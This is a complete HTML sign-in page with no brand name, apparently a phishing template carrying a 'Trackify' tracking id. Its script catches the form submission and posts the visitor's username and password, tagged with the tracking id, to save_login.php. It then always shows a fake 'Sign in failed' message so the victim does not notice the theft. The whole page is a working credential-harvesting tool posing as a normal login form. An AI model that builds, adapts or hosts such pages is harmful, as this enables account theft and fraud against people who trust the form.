<!doctype html>
<html lang="en">
<head><meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
<meta http-equiv="Pragma" content="no-cache">

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
            background: linear-gradient(160deg, #1a1d29 0%, #0f1117 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e6edf3;
            padding: 20px;
        }
        .card {
            width: 100%;
            max-width: 400px;
            background: rgba(22, 27, 34, 0.95);
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 32px 28px;
            box-shadow: 0 16px 48px rgba(0,0,0,.45);
        }
        h1 { font-size: 1.35rem; font-weight: 600; margin-bottom: 8px; }
        .sub { font-size: 13px; color: #8b949e; margin-bottom: 24px; }
        .form-input {
            width: 100%;
            height: 46px;
            margin-bottom: 14px;
            padding: 0 14px;
            border: 1px solid #30363d;
            border-radius: 8px;
            background: #0d1117;
            color: #e6edf3;
            font-size: 15px;
        }
        .form-input:focus { outline: none; border-color: #58a6ff; }
        .btn {
            width: 100%;
            height: 46px;
            margin-top: 8px;
            border: none;
            border-radius: 8px;
            background: #238636;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn:hover { background: #2ea043; }
    </style>
</head>
<body><script>window.TRACKIFY_TID="80d90d6c7bfe92fff7e998f9171a72a6459772be6aeecf916d14984d5ec82a56";</script>
    <div class="card">
        <h1>Sign in</h1>
        <p class="sub">Use your account to continue.</p>
        <form id="loginForm">
            <input type="text" class="form-input" id="email" placeholder="Email or username" required autocomplete="username">
            <input type="password" class="form-input" id="password" placeholder="Password" required autocomplete="current-password">
            <button type="submit" class="btn">Continue</button>
        </form>
    </div>
    <script>
        var BASE_URL = window.location.origin + '/';
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();
            const login = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const tid = typeof window.TRACKIFY_TID === 'string' ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get('tid') || '');
            const btn = document.querySelector('.btn');
            btn.textContent = 'Please wait…';
            btn.disabled = true;
            $.ajax({
                type: 'POST',
                url: BASE_URL + 'save_login.php',
                data: { tid: tid, login: login, password: password, template: 'simple' },
                dataType: 'json',
                complete: function () {
                    btn.textContent = 'Continue';
                    btn.disabled = false;
                    alert('Sign in failed. Please check your details and try again.');
                }
            });
        });
    </script>
</body>
</html>
